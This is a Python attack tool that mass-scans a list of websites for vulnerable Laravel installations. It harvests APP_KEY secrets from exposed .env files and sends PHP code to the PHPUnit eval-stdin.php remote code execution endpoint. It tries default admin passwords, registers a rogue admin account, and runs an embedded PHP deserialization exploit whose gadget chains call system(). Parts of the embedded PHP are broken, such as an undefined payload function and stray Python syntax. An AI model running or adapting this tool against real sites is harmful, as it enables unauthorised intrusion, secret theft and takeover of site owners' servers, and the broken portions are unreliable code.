import requests
import brotli
import gzip
import re
import sys
from concurrent.futures import ThreadPoolExecutor, as_completed
from io import BytesIO
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from colorama import Fore
import subprocess
from multiprocessing.dummy import Pool  # Mengimpor Pool dari multiprocessing.dummy

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

php_code = """<?php $satu = "php"; $dua = "info"; $tiga = $satu . $dua; if (function_exists($tiga)) { $tiga(); } else { echo "Fungsi " . $tiga . " tidak ada."; } ?>"""
headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
    "Accept-Language": "id,en-US;q=0.7,en;q=0.3",
    "Accept-Encoding": "gzip, deflate, br",
    "Upgrade-Insecure-Requests": "1",
    "Sec-Fetch-Dest": "document",
    "Sec-Fetch-Mode": "navigate",
    "Sec-Fetch-Site": "none",
    "Sec-Fetch-User": "?1",
    "Priority": "u=1",
    "Te": "trailers",
}

paths = [
    "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
    "/core/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
    "/backend/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
    "/app/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
    "/laravel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
    "/laravel/core/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
    "/beta/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
    "/config/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
    "/kyc/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
    "/admin/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
    "/prod/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
    "/api/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
    "/assets/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
    "/new/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"
]

if len(sys.argv) < 2:
    print("Usage: python script.py <listSite>")
    sys.exit(1)

listSite = sys.argv[1]
op = [i.strip() for i in open(listSite, "r").readlines()]
fr = Fore.RED
fc = Fore.CYAN
fw = Fore.WHITE
fg = Fore.GREEN

files_and_words = [
    ("/packages/barryvdh/elfinder/css/elfinder.min.css", "file manager for web", 'result_elfinder.txt'),
    ("/vendor/packages/barryvdh/elfinder/css/elfinder.min.css", "file manager for web", 'result_elfinder.txt'),
    ("/vendor/barryvdh/laravel-elfinder/resources/assets/js/standalonepopup.js", "event.preventDefault", 'result_elfinder.txt'),
    ("/core/./packages/barryvdh/elfinder/css/elfinder.min.css", "file manager for web", 'result_elfinder.txt'),
    ("/core/./vendor/barryvdh/laravel-elfinder/resources/assets/js/standalonepopup.js", "event.preventDefault", 'result_elfinder.txt'),
    ("/backend/./packages/barryvdh/elfinder/css/elfinder.min.css", "file manager for web", 'result_elfinder.txt'),
    ("/backend/./vendor/barryvdh/laravel-elfinder/resources/assets/js/standalonepopup.js", "event.preventDefault", 'result_elfinder.txt'),
    ("/app/./packages/barryvdh/elfinder/css/elfinder.min.css", "file manager for web", 'result_elfinder.txt'),
    ("/app/./vendor/barryvdh/laravel-elfinder/resources/assets/js/standalonepopup.js", "event.preventDefault", 'result_elfinder.txt'),
    ("/laravel/./packages/barryvdh/elfinder/css/elfinder.min.css", "file manager for web", 'result_elfinder.txt'),
    ("/laravel/./vendor/barryvdh/laravel-elfinder/resources/assets/js/standalonepopup.js", "event.preventDefault", 'result_elfinder.txt'),
    ("/beta/./packages/barryvdh/elfinder/css/elfinder.min.css", "file manager for web", 'result_elfinder.txt'),
    ("/beta/./vendor/barryvdh/laravel-elfinder/resources/assets/js/standalonepopup.js", "event.preventDefault", 'result_elfinder.txt'),
    ("/config/./packages/barryvdh/elfinder/css/elfinder.min.css", "file manager for web", 'result_elfinder.txt'),
    ("/config/./vendor/barryvdh/laravel-elfinder/resources/assets/js/standalonepopup.js", "event.preventDefault", 'result_elfinder.txt'),
    ("/kyc/./packages/barryvdh/elfinder/css/elfinder.min.css", "file manager for web", 'result_elfinder.txt'),
    ("/kyc/./vendor/barryvdh/laravel-elfinder/resources/assets/js/standalonepopup.js", "event.preventDefault", 'result_elfinder.txt'),
    ("/admin/./packages/barryvdh/elfinder/css/elfinder.min.css", "file manager for web", 'result_elfinder.txt'),
    ("/admin/./vendor/barryvdh/laravel-elfinder/resources/assets/js/standalonepopup.js", "event.preventDefault", 'result_elfinder.txt'),
    ("/prod/./packages/barryvdh/elfinder/css/elfinder.min.css", "file manager for web", 'result_elfinder.txt'),
    ("/prod/./vendor/barryvdh/laravel-elfinder/resources/assets/js/standalonepopup.js", "event.preventDefault", 'result_elfinder.txt'),
    ("/api/./packages/barryvdh/elfinder/css/elfinder.min.css", "file manager for web", 'result_elfinder.txt'),
    ("/api/./vendor/barryvdh/laravel-elfinder/resources/assets/js/standalonepopup.js", "event.preventDefault", 'result_elfinder.txt'),
    ("/assets/./packages/barryvdh/elfinder/css/elfinder.min.css", "file manager for web", 'result_elfinder.txt'),
    ("/assets/./vendor/barryvdh/laravel-elfinder/resources/assets/js/standalonepopup.js", "event.preventDefault", 'result_elfinder.txt'),
    ("/new/./packages/barryvdh/elfinder/css/elfinder.min.css", "file manager for web", 'result_elfinder.txt'),
    ("/new/./vendor/barryvdh/laravel-elfinder/resources/assets/js/standalonepopup.js", "event.preventDefault", 'result_elfinder.txt'),
    ("/docker/./packages/barryvdh/elfinder/css/elfinder.min.css", "file manager for web", 'result_elfinder.txt'),
    ("/docker/./vendor/barryvdh/laravel-elfinder/resources/assets/js/standalonepopup.js", "event.preventDefault", 'result_elfinder.txt'),
    ("/./.env", "APP_KEY=", 'result_env.txt'),
    ("/core/./.env", "APP_KEY=", 'result_env.txt'),
    ("/backend/./.env", "APP_KEY=", 'result_env.txt'),
    ("/app/./.env", "APP_KEY=", 'result_env.txt'),
    ("/laravel/./.env", "APP_KEY=", 'result_env.txt'),
    ("/laravel/core/./.env", "APP_KEY=", 'result_env.txt'),
    ("/beta/./.env", "APP_KEY=", 'result_env.txt'),
    ("/config/./.env", "APP_KEY=", 'result_env.txt'),
    ("/kyc/./.env", "APP_KEY=", 'result_env.txt'),
    ("/admin/./.env", "APP_KEY=", 'result_env.txt'),
    ("/prod/./.env", "APP_KEY=", 'result_env.txt'),
    ("/api/./.env", "APP_KEY=", 'result_env.txt'),
    ("/assets/./.env", "APP_KEY=", 'result_env.txt'),
    ("/new/./.env", "APP_KEY=", 'result_env.txt'),
    ("/admin/voyager-assets", "vendor/tcg/voyager", 'result_voyager.txt'),
    ("/storage/logs/laravel.log", "PDO->__construct('mysql:host=", 'result_laravel_logs.txt'),
    ("/register", None, 'result_register.txt'),
    ("/admin/register", None, 'result_register.txt'),
    ("/filemanager", None, 'result_filemanager.txt'),
    ("/laravel-filemanager", None, 'result_filemanager.txt'),
    ("/client/manifest.json", None, 'result_vebto.txt')
]

def save_result(file, url, results_set):
    if url not in results_set:
        with open(file, 'a') as f:
            f.write(url + "\n")
        results_set.add(url)

def decompress_response(response):
    encoding = response.headers.get('Content-Encoding', '')
    if 'br' in encoding:
        return brotli.decompress(response.content).decode('utf-8')
    elif 'gzip' in encoding or 'deflate' in encoding:
        buf = BytesIO(response.content)
        with gzip.GzipFile(fileobj=buf) as f:
            return f.read().decode('utf-8')
    else:
        return response.text

def checkenv(site):
    results_set = set()
    for path, word, result_file in files_and_words:
        found = False
        for protocol in ["http", "https"]:
            if found:
                break
            url = f"{protocol}://{site}{path}"
            try:
                request = requests.get(url, headers=headers, verify=False, timeout=10)
                if word:
                    if word in request.text:
                        save_result(result_file, url, results_set)
                        found = True
                        if path == "/./.env":
                            app_key_match = re.search(r"APP_KEY=(.+)", request.text)
                            if app_key_match:
                                app_key = app_key_match.group(1).strip()
                                exploit_laravel_unserialize(site, app_key)
                else:
                    if path.endswith("/register") or path.endswith("/admin/register"):
                        if request.status_code == 404:
                            continue
                        elif "login" in request.url or request.status_code in [301, 302, 303, 307, 308]:
                            save_result(result_file, url, results_set)
                            found = True
                        elif "<form" in request.text:
                            save_result(result_file, url, results_set)
                            found = True
                    elif "login" in request.url:
                        save_result('result_filemanager.txt', url, results_set)
                        found = True
                    elif "filemanager/upload\" role='form' id='uploadForm' name='uploadForm'" in request.text:
                        save_result('result_filemanager.txt', url, results_set)
                        found = True
                    
                    # Additional validation for standalonepopup.js
                    if path.endswith("standalonepopup.js") and request.status_code == 200 and 'content-type' in request.headers:
                        if "application/javascript" in request.headers['content-type']:
                            if "event.preventDefault" in request.text:
                                save_result(result_file, url, results_set)
                                found = True

                    # Check for manifest.json
                    if path == "/client/manifest.json" and request.status_code == 200:
                        if '"display": "standalone"' in request.text or '"src": "favicon/icon-72x72.png"' in request.text:
                            save_result(result_file, url, results_set)
                            found = True

                if path == "/admin/login":
                    ses = requests.Session()
                    getCsrf = ses.get(url)
                    if getCsrf.status_code == 200:
                        csrf = re.findall(r'"_token" value="(.*?)"', getCsrf.text)
                        if len(csrf) == 1:
                            data = {
                                "_token": csrf[0],
                                "email": "admin@admin.com",
                                "password": "password",
                                "remember": 1
                            }
                            try_login = ses.post(url, verify=False, timeout=10, data=data, allow_redirects=True)
                            if any(keyword in try_login.text for keyword in ['admin/profile', 'voyager-person', 'admin/logout', 'voyager-power', 'dashboard', 'voyager::']):
                                save_result('result_voyager.txt', url, results_set)
                                found = True
            except Exception as e:
                print(f"{fr}# {fw}" + site + f"{fw} | {fr}BOSOK")
                # Tidak menulis kesalahan ke file hasil jika tidak ditemukan atau terjadi kesalahan

def check_eval_stdin(site):
    results_set = set()
    found = False
    for path in paths:
        if found:
            break
        for protocol in ["http", "https"]:
            full_url = f"{protocol}://{site}{path}"
            print(f"Checking URL: {full_url}")
            try:
                response = requests.get(full_url, headers=headers, timeout=10)
                if response.status_code == 200:
                    print(f"Found {full_url}, attempting to execute PHP code...")
                    response_exec = requests.post(full_url, headers=headers, data=php_code, timeout=10)
                    print(f"Response status code: {response_exec.status_code}")
                    print(f"Response headers: {response_exec.headers}")

                    try:
                        response_text = decompress_response(response_exec)
                    except Exception as e:
                        print(f"Error decompressing response from {full_url}: {e}")
                        response_text = response_exec.text

                    print(f"Response text (first 500 chars): {response_text[:500]}")

                    if response_exec.status_code == 200 and "<!DOCTYPE html" in response_text and "phpinfo()" in response_text:
                        result = f"{full_url} - eval-stdin.php ditemukan dan bisa dieksekusi."
                        save_result("result_new.txt", full_url, results_set)
                        print(result)
                        found = True
                    else:
                        result = f"{full_url} - eval-stdin.php ditemukan tapi tidak bisa dieksekusi."
                        print(result)
                        found = True
                else:
                    result = f"{full_url} - eval-stdin.php tidak ditemukan."
                    print(result)
                    found = True
            except requests.RequestException as e:
                print(f"{full_url} - Error: {str(e)}")
                continue
    return f"{site} - eval-stdin.php tidak ditemukan di semua jalur."

def test_backpack(site):
    results_set = set()
    found = False
    for protocol in ["http", "https"]:
        if found:
            break
        base_url = f"{protocol}://{site}"
        try:
            url = f"{base_url}/admin/login"
            ses = requests.Session()
            getCsrf = ses.get(url)
            if getCsrf.status_code == 200:
                csrf = re.findall(r'"_token" value="(.*?)"', getCsrf.text)
                if len(csrf) == 1:
                    login_data = {
                        "_token": csrf[0],
                        "email": "admin@example.com",
                        "password": "admin"
                    }
                    try_login = ses.post(url, verify=False, timeout=10, data=login_data, allow_redirects=True)
                    if "dashboard" in try_login.text or "admin" in try_login.text:
                        elfinder_url = f"{base_url}/admin/elfinder"
                        elfinder_check = ses.get(elfinder_url, headers=headers, verify=False, timeout=10)
                        if "elfinder.min.css" in elfinder_check.text:
                            save_result('backpack.txt', elfinder_url, results_set)
                        found = True
                else:
                    register_url = f"{base_url}/admin/register"
                    get_register = ses.get(register_url)
                    if "Registration is closed" not in get_register.text:
                        csrf = re.findall(r'"_token" value="(.*?)"', get_register.text)
                        if len(csrf) == 1:
                            register_data = {
                                "_token": csrf[0],
                                "name": "yucaerin",
                                "email": "yucaerin@hotmail.com",
                                "password": "123123123",
                                "password_confirmation": "123123123",
                                "role": "admin",
                                "role_id": "1"
                            }
                            try_register = ses.post(register_url, verify=False, timeout=10, data=register_data, allow_redirects=True)
                            if "dashboard" in try_register.text or "admin" in try_register.text:
                                elfinder_url = f"{base_url}/admin/elfinder"
                                elfinder_check = ses.get(elfinder_url, headers=headers, verify=False, timeout=10)
                                if "elfinder.min.css" in elfinder_check.text:
                                    save_result('backpack.txt', elfinder_url, results_set)
                                found = True
        except Exception as e:
            print(f"{fr}# {fw}" + site + f"{fw} | {fr}BOSOK")

def exploit_laravel_unserialize(site, app_key):
    payloads = [
        # Payload 1
        'O:40:"Illuminate\\Broadcasting\\PendingBroadcast":2:{s:9:"' + "\x00" + '*' + "\x00" + 'events";O:15:"Faker\\Generator":1:{s:13:"' + "\x00" + '*' + "\x00" + 'formatters";a:1:{s:8:"dispatch";s:6:"system";}}s:8:"' + "\x00" + '*' + "\x00" + 'event";s:14:"uname -a";}',
        # Payload 2
        'O:40:"Illuminate\\Broadcasting\\PendingBroadcast":2:{s:9:"' + "\x00" + '*' + "\x00" + 'events";O:28:"Illuminate\\Events\\Dispatcher":1:{s:12:"' + "\x00" + '*' + "\x00" + 'listeners";a:1:{s:14:"uname -a";a:1:{i:0;s:6:"system";}}}s:8:"' + "\x00" + '*' + "\x00" + 'event";s:14:"uname -a";}',
        # Payload 3
        'O:40:"Illuminate\\Broadcasting\\PendingBroadcast":1:{s:9:"' + "\x00" + '*' + "\x00" + 'events";O:39:"Illuminate\\Notifications\\ChannelManager":3:{s:6:"' + "\x00" + '*' + "\x00" + 'app";s:14:"uname -a";s:17:"' + "\x00" + '*' + "\x00" + 'defaultChannel";s:1:"x";s:17:"' + "\x00" + '*' + "\x00" + 'customCreators";a:1:{s:1:"x";s:6:"system";}}}',
        # Payload 4
        'O:40:"Illuminate\\Broadcasting\\PendingBroadcast":2:{s:9:"' + "\x00" + '*' + "\x00" + 'events";O:31:"Illuminate\\Validation\\Validator":1:{s:10:"extensions";a:1:{s:0:"";s:6:"system";}}s:8:"' + "\x00" + '*' + "\x00" + 'event";s:14:"uname -a";}',
        # Payload 5
        'O:40:"Illuminate\\Broadcasting\\PendingBroadcast":2:{s:9:"' + "\x00" + '*' + "\x00" + 'events";O:25:"Illuminate\\Bus\\Dispatcher":1:{s:16:"' + "\x00" + '*' + "\x00" + 'queueResolver";a:2:{i:0;O:25:"Mockery\\Loader\\EvalLoader":0:{}i:1;s:4:"load";}}s:8:"' + "\x00" + '*' + "\x00" + 'event";O:38:"Illuminate\\Broadcasting\\BroadcastEvent":1:{s:10:"connection";O:32:"Mockery\\Generator\\MockDefinition":2:{s:9:"' + "\x00" + '*' + "\x00" + 'config";O:35:"Mockery\\Generator\\MockConfiguration":1:{s:7:"abcdefg";}s:7:"' + "\x00" + '*' + "\x00" + 'code";s:14:"uname -a";}}}}',
        # Payload 6
        'O:29:"Illuminate\\Support\\MessageBag":2:{s:11:"' + "\x00" + '*' + "\x00" + 'messages";a:0:{}s:9:"' + "\x00" + '*' + "\x00" + 'format";O:40:"Illuminate\\Broadcasting\\PendingBroadcast":2:{s:9:"' + "\x00" + '*' + "\x00" + 'events";O:25:"Illuminate\\Bus\\Dispatcher":1:{s:16:"' + "\x00" + '*' + "\x00" + 'queueResolver";a:2:{i:0;O:25:"Mockery\\Loader\\EvalLoader":0:{}i:1;s:4:"load";}}s:8:"' + "\x00" + '*' + "\x00" + 'event";O:38:"Illuminate\\Broadcasting\\BroadcastEvent":1:{s:10:"connection";O:32:"Mockery\\Generator\\MockDefinition":2:{s:9:"' + "\x00" + '*' + "\x00" + 'config";O:35:"Mockery\\Generator\\MockConfiguration":1:{s:7:"abcdefg";}s:7:"' + "\x00" + '*' + "\x00" + 'code";s:14:"uname -a";}}}}}',
        # Payload 7
        'O:40:"Illuminate\\Broadcasting\\PendingBroadcast":2:{s:9:"' + "\x00" + '*' + "\x00" + 'events";O:25:"Illuminate\\Bus\\Dispatcher":1:{s:16:"' + "\x00" + '*' + "\x00" + 'queueResolver";a:2:{i:0;O:25:"Mockery\\Loader\\EvalLoader":0:{}i:1;s:4:"load";}}s:8:"' + "\x00" + '*' + "\x00" + 'event";O:38:"Illuminate\\Broadcasting\\BroadcastEvent":1:{s:10:"connection";O:32:"Mockery\\Generator\\MockDefinition":2:{s:9:"' + "\x00" + '*' + "\x00" + 'config";O:35:"Mockery\\Generator\\MockConfiguration":1:{s:7:"abcdefg";}s:7:"' + "\x00" + '*' + "\x00" + 'code";s:14:"uname -a";}}}}'
    ]

    php_exploit_code = f"""
    #!/usr/bin/env php
    <?php
    error_reporting(0);
    class Func_
    {{
        public function Serialize($key, $value)
        {{
            $cipher = 'AES-256-CBC';
            $iv = random_bytes(openssl_cipher_iv_length($cipher));
            $value = \openssl_encrypt(base64_decode($value), $cipher, base64_decode($key), 0, $iv);

            if ($value === false) {{
                exit("Could not encrypt the data.");
            }}

            $iv = base64_encode($iv);
            $mac = hash_hmac('sha256', $iv . $value, base64_decode($key));

            $json = json_encode(compact('iv', 'value', 'mac'));

            if (json_last_error() !== JSON_ERROR_NONE) {{
                echo "Could not json encode data." . PHP_EOL;
                exit();
            }}

            $encodedPayload = base64_encode($json);
            return $encodedPayload;
        }}
    }}
    class Requester
    {{
        public function Requests($url, $postdata = null, $headers = null, $follow = true)
        {{
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
            curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
            curl_setopt($ch, CURLOPT_HEADER, 1);
            if (!empty($headers) && $headers != null)
            {{
                curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
            }}
            if (!empty($postdata) && $postdata != null)
            {{
                curl_setopt($ch, CURLOPT_POST, 1);
                curl_setopt($ch, CURLOPT_POSTFIELDS, $postdata);
            }}
            if ($follow)
            {{
                curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
            }}
            $data = curl_exec($ch);
            $header_size = curl_getinfo($ch, CURLINFO_HEADER_SIZE);
            $status_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
            $head = substr($data, 0, $header_size);
            $body = substr($data, $header_size);
            return json_decode(json_encode(array(
                'status_code' => $status_code,
                'headers' => $this->HeadersToArray($head),
                'body' => $body
            )));
        }}
        public function HeadersToArray($str)
        {{
            $str = explode("\\r\\n", $str);
            $str = array_splice($str, 0, count($str) - 1);
            $output = [];
            foreach ($str as $item)
            {{
                if ($item === '' || empty($item)) continue;
                $index = stripos($item, ": ");
                $key = substr($item, 0, $index);
                $key = strtolower(str_replace('-', '_', $key));
                $value = substr($item, $index + 2);
                if (@$output[$key])
                {{
                    if (strtolower($key) === 'set_cookie')
                    {{
                        $output[$key] = $output[$key] . "; " . $value;
                    }}
                    else
                    {{
                        $output[$key] = $output[$key];
                    }}
                }}
                else
                {{
                    $output[$key] = $value;
                }}
            }}
            return $output;
        }}
    }}
    class Exploit extends Requester
    {{
        public $url;
        public $vuln;
        public $app_key;
        public function __construct($url)
        {{
            $this->url = $url;
            $this->vuln = null;
            $this->app_key = null;
        }}
        public function getAppKeyEnv()
        {{
            $req = parent::Requests($this->url . "/.env", null, null, $follow = false);
            if (preg_match('/APP_KEY/', $req->body))
            {{
                preg_match_all('/APP_KEY=([a-zA-Z0-9:;\\/\\\\=$%^&*()-+_!@#]+)/', $req->body, $matches, PREG_SET_ORDER, 0);
                $this->app_key = $matches[0][1];
            }}
        }}
        public function getAppKey()
        {{
            $req = parent::Requests($this->url, 'a=a', null, false);
            if (preg_match('/<td>APP_KEY<\\/td>/', $req->body))
            {{
                preg_match_all('/<td>APP_KEY<\\/td>\\s+<td><pre.*>(.*?)<\\/span>/', $req->body, $matches, PREG_SET_ORDER, 0);
                $this->app_key = $matches[0][1];
            }}
            else
            {{
                $this->getAppKeyEnv($this->url);
            }}
        }}
    }}
    function Help() {{
        echo "
        url=URL // Target Required
        Optionals:
        key=APP_KEY // Setting app key if u have
        function=system // Function ex : system, passthru
        method=1 // method 1 - 4 Required function parameter, 5 - 6 ( Eval mode )
        ". PHP_EOL;
    }}
    parse_str(implode("&", array_slice($argv, 1)), $_GET);
    if (!$_GET['url']) return Help();
    $urls = $_GET['url'];
    $Req = new Requester();
    $wibu = new Exploit($urls);
    $Func = new Func_();
    $function = 'system';
    $method = 1;
    if ($_GET['key']) {{
        $wibu->app_key = $_GET['key'];
    }} else {{
        $wibu->getAppKey();
    }}
    if ($_GET['function']) {{
        $function = $_GET['function'];
    }}
    if ($_GET['method']) {{
        $method = $_GET['method'];
    }}
    if ($wibu->app_key != null)
    {{
        while (true)
        {{
            $cmd = readline('Command ~> ');
            $app = str_replace('base64:', '', $wibu->app_key);
            $command = $Func->GeneratePayload($cmd, $function, $method);
            $serialize = $Func->Serialize($app, $command);
            $header = array(
                'Cookie: XSRF-TOKEN=' . $serialize
            );
            $bre = $Req->Requests($urls,null, $header, false);
            $res = explode('</html>', $bre->body)[1];
            echo ($res) ? $res . PHP_EOL : 'Empty Response' . PHP_EOL;
            if "uname -a" in res:
                with open("result_unserialize.txt", "a") as result_file:
                    result_file.write(url + "\n")
                    break
        }}
    }}
    else
    {{
        echo $urls . " ===> Cannot get APP_KEY!" . PHP_EOL;
    }} ?>
    """

    with open('exploit.php', 'w') as file:
        file.write(php_exploit_code)

    try:
        result = subprocess.run(['php', 'exploit.php', f'url={site}', f'key={app_key}', 'function=system', 'method=1'],
                                capture_output=True, text=True, timeout=60)
        if 'uname -a' in result.stdout:
            with open('result_unserialize.txt', 'a') as result_file:
                result_file.write(site + "\n")
    except subprocess.TimeoutExpired:
        print(f"Timeout while trying to exploit {site}")

def getdebug(url):
    try:
        with requests.Session() as session:
            session.headers = {
                "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.106 Safari/537.36"}
            wew = session.post(url, data={"0x[1]": "setsunawatanabeio"}, verify=False, timeout=10, allow_redirects=False)
            if '<td>APP_KEY</td>' in wew.text:
                print(f"[-] [LARAVEL DEBUG] [OK] {url}")
                with open("result_debug_laravel.txt", "a") as result_file:
                    result_file.write(url + "\n")
    except Exception as e:
        pass

def main(file_path):
    domains = read_urls(file_path)
    results = []

    with ThreadPoolExecutor(max_workers=5) as executor:
        future_to_domain = {executor.submit(check_eval_stdin, domain): domain for domain in domains}
        for future in as_completed(future_to_domain):
            domain = future_to_domain[future]
            try:
                result = future.result()
                results.append(result)
            except Exception as exc:
                error_message = f"{domain} - Exception: {str(exc)}"
                results.append(error_message)
                print(error_message)

    for result in results:
        print(result)

def read_urls(file_path):
    with open(file_path, 'r', encoding='utf-8') as file:
        urls = file.readlines()
    return [url.strip() for url in urls]

kekw = Pool(5)  # Thread
kekw.map(checkenv, op)
kekw.map(test_backpack, op)
kekw.close()
kekw.join()

print("Selesai memproses semua situs.")

if __name__ == "__main__":
    main(listSite)
